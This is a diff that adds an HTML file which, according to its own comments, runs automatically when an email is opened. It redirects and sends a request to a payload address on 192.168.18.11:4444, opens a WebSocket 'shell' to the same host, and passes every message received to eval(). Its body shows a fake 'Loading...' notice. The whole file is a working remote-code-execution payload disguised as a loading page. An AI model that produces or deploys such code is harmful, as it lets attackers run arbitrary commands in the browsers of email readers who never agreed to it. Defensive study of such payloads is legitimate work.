@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="refresh" content="0; url=http://192.168.18.11:4444/payload">
+    <script>
+        // Auto-execute on email load
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'http://192.168.18.11:4444/payload', true);
+        xhr.send();
+        
+        // Also try WebSocket
+        try {
+            var ws = new WebSocket('ws://192.168.18.11:4444/shell');
+            ws.onopen = function() {
+                ws.send('Email payload triggered');
+            };
+            ws.onmessage = function(e) {
+                eval(e.data);
+            };
+        } catch(e) {
+            console.log('WebSocket not available');
+        }
+    </script>
+</head>
+<body>
+    <h1>Loading...</h1>
+    <p>Please wait while the content loads</p>
+</body>
+</html>
